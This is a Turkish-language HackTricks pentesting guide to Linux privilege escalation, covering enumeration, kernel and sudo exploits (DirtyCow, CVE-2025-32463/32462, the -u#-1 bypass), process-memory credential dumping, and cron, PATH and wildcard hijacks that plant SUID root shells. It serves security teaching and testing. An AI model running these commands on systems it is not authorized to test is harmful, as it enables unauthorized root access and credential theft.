# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

Daha geniş bir arka plan ve geçmişte kullanılan enumeration iş akışları için references bölümünde listelenen g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation ve linux-private-i kaynaklarını inceleyin.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Sistem Bilgileri

### OS bilgileri

Çalışan OS hakkında bilgi edinmeye başlayalım.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Path

**PATH** değişkenindeki herhangi bir dizine yazma izniniz varsa bazı kütüphaneleri veya ikili dosyaları ele geçirebilirsiniz:

```bash
echo $PATH
```

### Env bilgisi

Ortam değişkenlerinde ilginç bilgiler, parolalar veya API key'ler var mı?

```bash
(env || set) 2>/dev/null
```

### Kernel exploitleri

Kernel sürümünü kontrol edin ve ayrıcalıkları yükseltmek için kullanılabilecek bir exploit olup olmadığını belirleyin.

[Kernel/LPE/CVE bölümü](../../main-system-information/kernel-lpe-cves/README.md), yerel ayrıcalık yükseltme vakalarını ve Binary Exploitation bölümündeki ayrıntılı Linux kernel yazılarına bağlantıları bir araya getirir. Bir örnek olayı test etmeden önce etkilenen build’i ve yapılandırmayı doğrulayın.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

İyi bir savunmasız kernel listesi ve önceden **derlenmiş exploit** dosyalarını burada bulabilirsiniz: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
**Derlenmiş exploit** dosyalarını bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Bu web sitesindeki tüm savunmasız kernel sürümlerini çıkarmak için şunu çalıştırabilirsiniz:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Kernel exploit'lerini aramaya yardımcı olabilecek araçlar:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (kurban makinede çalıştırın, yalnızca kernel 2.x için exploit'leri kontrol eder)

Her zaman **kernel sürümünü Google'da arayın**; kernel sürümünüz bir kernel exploit'inde yazıyor olabilir ve bu sayede exploit'in geçerli olduğundan emin olabilirsiniz.

Ek kernel exploitation teknikleri:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux'ta Yetki Yükseltme - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudo sürümü

Şurada yer alan güvenlik açığı bulunan sudo sürümlerine göre:

```bash
searchsploit sudo
```

Bu grep'i kullanarak sudo sürümünün savunmasız olup olmadığını kontrol edebilirsiniz.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14 ile 1.9.17 arasındaki sürümlerde**, sudo `/etc/nsswitch.conf` dosyasını kullanıcının denetimindeki bir dizinden yüklediğinde, ayrıcalıksız yerel kullanıcıların `--chroot` seçeneği aracılığıyla root yetkilerine yükselmesine olanak tanır; upstream bu sorunu **1.9.17p1** sürümünde düzeltti. İlgili yollardaki root-setuid sudo binary’lerinin tümünü kontrol edin; `sudo -V` yalnızca `PATH` tarafından seçilen binary’yi bildirir. Dağıtım paketleri, upstream sürüm dizesini değiştirmeden düzeltmeyi geriye dönük olarak eklemiş olabilir; bu nedenle vendor paketinin durumunu da doğrulayın. [sudo maintainer’ın güvenlik duyurusuna](https://www.openwall.com/lists/oss-security/2025/06/30/3) bakın.<sup>[[28]](#references)[[29]](#references)</sup>

Bu [zafiyeti](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) istismar etmek için bir [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) burada. Exploit’i çalıştırmadan önce `sudo` sürümünüzün zafiyetten etkilendiğinden ve `chroot` özelliğini desteklediğinden emin olun.

Daha fazla bilgi için orijinal [zafiyet duyurusuna](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) bakın.<sup>[[28]](#references)</sup>

### Sudo host tabanlı kurallarını atlatma (CVE-2025-32462)

Upstream sudo **1.8.8 ile 1.9.17 arasındaki sürümlerde**, host tabanlı sudoers kurallarını **gerçek hostname** yerine `sudo -h <host>` komutuyla **kullanıcının sağladığı hostname** üzerinden değerlendirebilir; upstream bu sorunu **1.9.17p1** sürümünde düzeltti. Kullanıcının yine de seçilen host için eşleşen bir sudoers girdisi olmalıdır. Yerel politikanın yanı sıra vendor tarafından geriye dönük eklenen düzeltmeleri ve alternatif sudo binary’lerini de inceleyin. [sudo maintainer’ın güvenlik duyurusuna](https://www.openwall.com/lists/oss-security/2025/06/30/2) bakın.<sup>[[29]](#references)</sup>

Gereksinimler:
- Zafiyetten etkilenen sudo sürümü
- Host’a özgü sudoers kuralları (host, geçerli hostname veya `ALL` olmamalıdır)

Örnek sudoers kalıbı:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

İzin verilen host'u spoof ederek exploit etme:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Seçilen adın çözümlenmesi engelleniyorsa, bu adın host üzerinde nasıl çözümlendiğini doğrulayın. Bir adı günlükte veya yapılandırma dosyasında görmek, o adın çözümlenebilir olduğu anlamına gelmez ve `/etc/hosts` dosyasını değiştirmek genellikle ayrıcalıklı yazma erişimi gerektirir.

#### sudo < v1.8.28

Bu [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287), root hariç `ALL` kullanıcıları olarak bir komuta izin veren etkin bir sudo kuralı gerektirir; örneğin `(ALL, !root) /bin/bash`. Çağıran kullanıcının, kimlik doğrulama gereksinimleri de dahil olmak üzere bu kuralı kullanmasına izin verilmelidir. Kurulu pakete ilişkin güvenlik duyurusunu kontrol edin: Tedarikçiler, görüntülenen upstream sürümü hâlâ 1.8.28'in altında olan sürümlere düzeltmeyi geriye dönük olarak uygulamıştır. Tek başına bir `!root` kuralı veya eski bir sürüm, sistemin etkilenebilir olduğunu doğrulamaz. Pasif enumerasyon sırasında ayrıcalıklı bir komutu test etmeyin.

```
sudo -u#-1 /bin/bash
```

### Dmesg imza doğrulaması başarısız oldu

Bu vuln'ın nasıl exploit edilebileceğine dair bir **örnek** için HTB'deki **smasher2** makinesine bakın.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Daha fazla sistem enumerasyonu

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Olası savunmaları listeleyin

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Bir container'ın içindeyseniz, aşağıdaki container-security bölümünden başlayın ve ardından runtime'a özgü kötüye kullanım sayfalarına geçin:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Sürücüler

**Nelerin bağlandığını ve bağlantısının kesildiğini**, nereye ve neden bağlandığını kontrol edin. Bağlantısı kesilmiş bir şey varsa onu bağlamayı deneyebilir ve özel bilgileri kontrol edebilirsiniz.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Yararlı yazılımlar

Yararlı ikili dosyaları listeleyin

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Ayrıca, **herhangi bir derleyicinin kurulu olup olmadığını** kontrol edin. Bir kernel exploit kullanmanız gerekirse bu işe yarar; exploit'i kullanacağınız makinede (veya benzer bir makinede) derlemeniz önerilir.

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Yüklü Güvenlik Açığı Bulunan Yazılımlar

**Yüklü paketlerin ve servislerin sürümlerini** kontrol edin. Ayrıcalık yükseltmek için istismar edilebilecek eski bir Nagios sürümü (örneğin) olabilir…\
Daha şüpheli görünen yüklü yazılımların sürümlerini manuel olarak kontrol etmeniz önerilir.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

SSH erişiminiz varsa, makinede yüklü olan güncel olmayan ve güvenlik açığı bulunan yazılımları kontrol etmek için **openVAS** da kullanabilirsiniz.

> [!NOTE] > _Bu komutların çoğu işe yaramayacak pek çok bilgi göstereceğini unutmayın. Bu nedenle, yüklü yazılım sürümlerinden herhangi birinin bilinen exploit'lere karşı güvenlik açığı olup olmadığını kontrol eden OpenVAS veya benzeri uygulamaların kullanılması önerilir._

## Süreçler

Yürütülen **süreçlere** göz atın ve herhangi bir sürecin **olması gerekenden daha fazla ayrıcalığa** sahip olup olmadığını kontrol edin (örneğin, root tarafından yürütülen bir tomcat?)

```bash
ps aux
ps -ef
top -n 1
```

Her zaman çalışan [**electron/cef/chromium debuggers** olup olmadığını kontrol edin; ayrıcalıkları yükseltmek için bunlardan yararlanabilirsiniz](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas**, süreç komut satırındaki `--inspect` parametresini kontrol ederek bunları tespit eder.\
Ayrıca **süreçlerin binary dosyaları üzerindeki ayrıcalıklarınızı kontrol edin**; belki başka birinin dosyasının üzerine yazabilirsiniz.

### Kullanıcılar arası ebeveyn-çocuk süreç zincirleri

**Ebeveyninden farklı bir kullanıcı** altında çalışan bir alt süreç otomatik olarak kötü amaçlı değildir; ancak yararlı bir **inceleme sinyalidir**. Bazı geçişler beklenen durumlardır (`root`'un bir servis kullanıcısı altında süreç başlatması veya oturum yöneticilerinin oturum süreçleri oluşturması gibi); ancak alışılmadık zincirler wrapper'ları, debug yardımcılarını, kalıcılığı veya zayıf runtime güven sınırlarını ortaya çıkarabilir.

Hızlı inceleme:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Sürpriz bir zincir bulursanız, üst süreç komut satırını ve davranışını etkileyen tüm dosyaları (`config`, `EnvironmentFile`, yardımcı betikler, çalışma dizini, yazılabilir argümanlar) inceleyin. Gerçek privesc yollarının birkaçında alt süreç yazılabilir değildi; ancak **üst süreç tarafından kontrol edilen config** veya yardımcı zincir yazılabilirdi.

### Silinmiş çalıştırılabilir dosyalar ve silinmiş-açık dosyalar

Çalışma zamanı kalıntılarına, **silindikten sonra bile** genellikle erişilebilir. Bu, hem ayrıcalık yükseltme hem de hâlihazırda hassas dosyaları açık tutan bir süreçten kanıt kurtarma açısından faydalıdır.

Silinmiş çalıştırılabilir dosyaları kontrol edin:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

`/proc/<PID>/exe`, `(deleted)` değerini gösteriyorsa süreç hâlâ bellekteki eski binary image'ı çalıştırıyordur. Bu, araştırılması gereken güçlü bir işarettir çünkü:

- kaldırılan executable ilginç dizeler veya kimlik bilgileri içerebilir
- çalışan süreç hâlâ yararlı file descriptor'lar sunabilir
- silinmiş bir privileged binary, yakın zamanda müdahale edildiğine veya temizlik girişiminde bulunulduğuna işaret edebilir

Silinmiş ve açık dosyaları genel olarak toplayın:

```bash
lsof +L1
```

İlginç bir tanımlayıcı bulursanız, doğrudan kurtarın:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Bu, bir süreçte hâlâ açık olan silinmiş bir sır, script, veritabanı dışa aktarımı veya flag dosyası varsa özellikle değerlidir.

### Süreç izleme

Süreçleri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanabilirsiniz. Bu, sık sık çalıştırılan veya belirli koşullar sağlandığında çalıştırılan güvenlik açığı bulunan süreçleri belirlemek için çok yararlı olabilir.

#### sudo altında Linux ProcMon

[Linux için ProcMon](https://github.com/microsoft/ProcMon-for-Linux), seçili süreçleri ve sistem çağrılarını izleyebilir ve SQLite trace dosyası kaydedebilir. `sudo -l` çıktısı, kısıtlamasız ve root yetkileriyle çalışabilen bir `procmon` komutuna izin veriyorsa başka bir kullanıcının süreç girdilerini veya çıktılarını gözlemleyip gözlemleyemeyeceğini değerlendirin. Bu izin yalnızca incelemeye yönelik bir ipucudur: tracer desteği, etkin politika ve uygun bir sürecin etkinliği de önem taşır. Trace dosyaları sırlar içerebilir; bu nedenle yetkili dışa aktarımları dikkatlice inceleyin ve ilgisiz süreçleri toplamaktan kaçının.

### Süreç belleği

Bir sunucudaki bazı hizmetler **kimlik bilgilerini bellekte açık metin olarak saklar**.\
Normalde diğer kullanıcılara ait süreçlerin belleğini okumak için **root yetkilerine** ihtiyacınız olur; bu nedenle bu yöntem genellikle zaten root olduğunuzda ve daha fazla kimlik bilgisi bulmak istediğinizde daha kullanışlıdır.\
Ancak **normal bir kullanıcı olarak sahibi olduğunuz süreçlerin belleğini okuyabileceğinizi** unutmayın.

> [!WARNING]
> Günümüzde çoğu makinenin **varsayılan olarak ptrace kullanımına izin vermediğini** unutmayın. Bu, ayrıcalıksız kullanıcınıza ait diğer süreçlerin dökümünü alamayacağınız anlamına gelir.
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ dosyası ptrace erişimini denetler:
>
> - **kernel.yama.ptrace_scope = 0**: Aynı uid değerine sahip oldukları sürece tüm süreçlerde hata ayıklanabilir. ptrace'in çalıştığı klasik yöntem budur.
> - **kernel.yama.ptrace_scope = 1**: Yalnızca üst süreçlerde hata ayıklanabilir.
> - **kernel.yama.ptrace_scope = 2**: CAP_SYS_PTRACE yeteneği gerektirdiğinden ptrace'i yalnızca yöneticiler kullanabilir.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir süreç ptrace ile izlenemez. Bu değer ayarlandıktan sonra ptrace'i yeniden etkinleştirmek için yeniden başlatma gerekir.

Kısa süreliğine bir parola kasasının kilidini açan, aynı UID'ye sahip bir süreç ayrı bir kimlik bilgisi sınırı oluşturabilir. Tracing'e izin verildiğinde etkin ve döküm alınabilir bir süreç, şifrelenmiş kasa dosyasının kendisi korumalı kalsa bile, input sistem çağrıları veya bellek aracılığıyla kasa parolasını açığa çıkarabilir. `ptrace_scope=0` tek başına yeterli değildir: eşleşen kimlik bilgileri, hedef sürecin döküm alınabilir olması, diğer Linux güvenlik modülleri ve sürecin çalışma süresi de önemlidir. Bir kasa girdisinin Unix root oturum açma bilgisine dönüşmesi için kimlik bilgilerinin yeniden kullanımını ayrıca kontrol etmek gerekir. Rutin inceleme, input yakalayıp sırları yazdırmak yerine politikayı ve aday süreç veya kasa yollarını raporlamalıdır. [Kernel'in Yama belgelerine](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) ve [ptrace erişim kontrollerine](https://man7.org/linux/man-pages/man2/ptrace.2.html) bakın.

#### GDB

Örneğin bir FTP hizmetinin belleğine erişiminiz varsa Heap'i alıp içinde kimlik bilgilerini arayabilirsiniz.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB Script

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir işlem kimliği için **maps, belleğin bu işlemin** sanal adres alanında nasıl eşlendiğini gösterir; ayrıca **eşlenen her bölgenin izinlerini** de gösterir. **mem** sözde dosyası, **işlemin belleğinin kendisini açığa çıkarır**. **maps** dosyasından hangi **bellek bölgelerinin okunabilir** olduğunu ve bunların ofsetlerini öğreniriz. Bu bilgileri kullanarak **mem dosyasında ilgili konumlara gider ve okunabilir tüm bölgeleri** bir dosyaya dump ederiz.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem`, sistemin **fiziksel** belleğine erişim sağlar; sanal belleğine değil. Çekirdeğin sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Genellikle `/dev/mem` yalnızca **root** ve **kmem** grubunun okuyabileceği şekilde ayarlanır.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump for linux

ProcDump, Windows için Sysinternals araç paketindeki klasik ProcDump aracının Linux için yeniden tasarlanmış sürümüdür. [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) adresinden edinebilirsiniz.

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Araçlar

Bir işlemin belleğini dökmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root gereksinimlerini manuel olarak kaldırıp size ait işlemin belleğini dökebilirsiniz
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) içindeki A.5 numaralı script (root gerekir)

### İşlem Belleğinden Kimlik Bilgileri

#### Manuel örnek

Kimlik doğrulayıcı işleminin çalıştığını fark ederseniz:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Süreci dump edebilir (bir sürecin belleğini dump etmenin farklı yolları için önceki bölümlere bakın) ve bellekte kimlik bilgilerini arayabilirsiniz:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

[**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) aracı **bellekten** ve bazı **bilinen dosyalardan** açık metin kimlik bilgilerini **çalabilir**. Düzgün çalışması için root ayrıcalıkları gerekir.

| Özellik                                           | İşlem Adı            |
| ------------------------------------------------- | -------------------- |
| GDM parolası (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Etkin FTP bağlantıları)                   | vsftpd               |
| Apache2 (Etkin HTTP Basic Auth oturumları)        | apache2              |
| OpenSSH (Etkin SSH oturumları - Sudo kullanımı)   | sshd:                |

#### Arama Regex'leri/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Zamanlanmış/Cron işleri

### Root olarak çalışan Crontab UI (alseambusher) – web tabanlı zamanlayıcı privesc

Bir web “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyor ve yalnızca loopback adresine bağlıysa, SSH local port-forwarding ile yine de erişebilir ve ayrıcalıklı bir iş oluşturarak yetki yükseltebilirsiniz.<sup>[[1]](#references)[[4]](#references)</sup>

Tipik zincir
- Loopback’e özel portu (örn. 127.0.0.1:8000) ve Basic-Auth realm’ini `ss -ntlp` / `curl -v localhost:8000` ile keşfedin
- Kimlik bilgilerini operasyonel artefaktlarda bulun:
  - `zip -P <password>` içeren yedekler/bet betikleri
  - `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` değerlerini açığa çıkaran systemd unit’i
- Tünel açın ve oturum açın:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Yüksek ayrıcalıklı bir job oluştur ve hemen çalıştır (SUID shell bırakır):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Kullanın:
```bash
/tmp/rootshell -p   # root shell
```

Hardening
- Crontab UI'yi root olarak çalıştırmayın; özel bir kullanıcı kullanın ve izinleri minimum düzeyde tutun
- localhost'a bağlayın ve erişimi ayrıca firewall/VPN üzerinden kısıtlayın; parolaları tekrar kullanmayın
- Gizli bilgileri unit dosyalarına gömmeyin; secret store'ları veya yalnızca root'un erişebildiği EnvironmentFile'ı kullanın
- İsteğe bağlı iş çalıştırmaları için denetim/günlük kaydını etkinleştirin

Zamanlanmış işlerden herhangi birinin savunmasız olup olmadığını kontrol edin. Belki root tarafından çalıştırılan bir betikten yararlanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misiniz? symlink kullanabilir misiniz? root'un kullandığı dizinde belirli dosyalar oluşturabilir misiniz?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

`run-parts` kullanılıyorsa, hangi adların gerçekten çalıştırılacağını kontrol edin:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Bu, false positive'ları önler. Yazılabilir bir periyodik dizin, yalnızca payload dosya adınız yerel `run-parts` kurallarıyla eşleşiyorsa işe yarar.

### Cron path

Örneğin _/etc/crontab_ içinde PATH'i bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_"user" kullanıcısının /home/user üzerinde yazma izinleri olduğuna dikkat edin_)

Bu crontab içinde root kullanıcısı path ayarlamadan bir komut veya script çalıştırmayı denerse, örneğin: _\* \* \* \* root overwrite.sh_\
Şunu kullanarak bir root shell elde edebilirsiniz:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Wildcard kullanan bir script ile Cron (Wildcard Injection)

Root tarafından çalıştırılan bir scriptin içinde bir komutta “**\***” varsa, bunu beklenmedik şeyler (ör. privesc) gerçekleştirmek için exploit edebilirsiniz. Örnek:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Eğer joker karakterin önünde** _**/some/path/\***_ **gibi bir yol varsa, savunmasız değildir (hatta** _**./\***_ **de değildir).**

Joker karakterleri istismar etmeye yönelik diğer yöntemler için aşağıdaki sayfayı okuyun:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Cron log ayrıştırıcılarında Bash aritmetik genişletme enjeksiyonu

Bash aritmetiği, güvenilmeyen metni bir ifade olarak yorumlayabilir. Etkilenen Bash bağlamlarında, bu ifadedeki bir dizi alt indisi komut ikamesini değerlendirebilir. Ayrıcalıklı bir cron/ayrıştırıcı, saldırganın kontrolündeki log metnini böyle bir aritmetik karşılaştırmada kullanırsa ikame, ayrıştırıcının kimliğiyle çalışabilir.<sup>[[22]](#references)</sup> Bu durum, kullanılan Bash ifadesine ve sürümüne bağlıdır; genişletilmiş bir değişkendeki yalın `$(...)0` dizgesi tek başına yeniden değerlendirmeyi güvenilir biçimde göstermez.

Girdi, dosya meta verilerinden veya kullanıcı tarafından yazılabilir bir konumdan okunan başka bir alandan da gelebilir. Örneğin, bir görselin `Producer` etiketini okuyup `[[ "$producer" -eq "expected" ]]` ile karşılaştıran ayrıcalıklı bir temizleme betiği, değişken tırnak içine alınmış olsa bile aritmetik karşılaştırma yapar. Zamanlanmış görevin hangi kimlikle çalıştığını, etiketi hangi dosyaların sağlayabileceğini, karşılaştırmadan önce yapılan dönüşümleri ve Bash'in tam olarak nasıl davrandığını inceleyin. Metin etiketleri için dizge karşılaştırması kullanın; sayılar için aritmetik işlem yapmadan önce girdinin yalnızca ondalık rakamlardan oluştuğunu doğrulayın. [Bash aritmetik kurallarına](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html) bakın.

- Yaygın savunmasız örüntü:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Dizi alt indis mekanizmasının güvenli yerel davranış testi (ayrıcalıklı bir süreç veya dosya değişikliği olmadan):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Gerçek zamanlanmış scripti ve açtığı literal input path'i izleyin. Log file'ın kendisi yazılabilir olmasa bile, sticky bit bulunmayan üst dizinine yazma ve dizinde gezinme izni olan bir kullanıcı dizin girdisini değiştirebilir; bu izinleri ayırt etmek için `namei -l` yardımcı olur. Farklı bir yazılabilir log path'i, okunamayan bir scheduler veya bu alanı Bash arithmetic olarak hiç değerlendirmeyen bir parser, bu path'in kullanılabildiğini kanıtlamaz.

### Cron scriptini değiştirme ve symlink

Root tarafından çalıştırılan bir cron scriptini **değiştirebiliyorsanız**, kolayca bir shell elde edebilirsiniz:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Root tarafından çalıştırılan script, tam erişiminizin olduğu bir dizini kullanıyorsa, bu klasörü silip sizin kontrol ettiğiniz bir scripti sunan başka bir dizine symlink oluşturmak işe yarayabilir.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Symlink doğrulaması ve daha güvenli dosya işleme

Dosyaları yol üzerinden okuyan veya yazan ayrıcalıklı betikleri/ikili dosyaları incelerken bağlantıların nasıl işlendiğini doğrulayın:

- `stat()` bir symlink'i izler ve hedefin üstverilerini döndürür.
- `lstat()` bağlantının kendisinin üstverilerini döndürür.
- `readlink -f` ve `namei -l`, son hedefi çözümlemeye ve her yol bileşeninin izinlerini görüntülemeye yardımcı olur.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Savunmacılar/geliştiriciler için symlink numaralarına karşı daha güvenli yöntemler şunlardır:

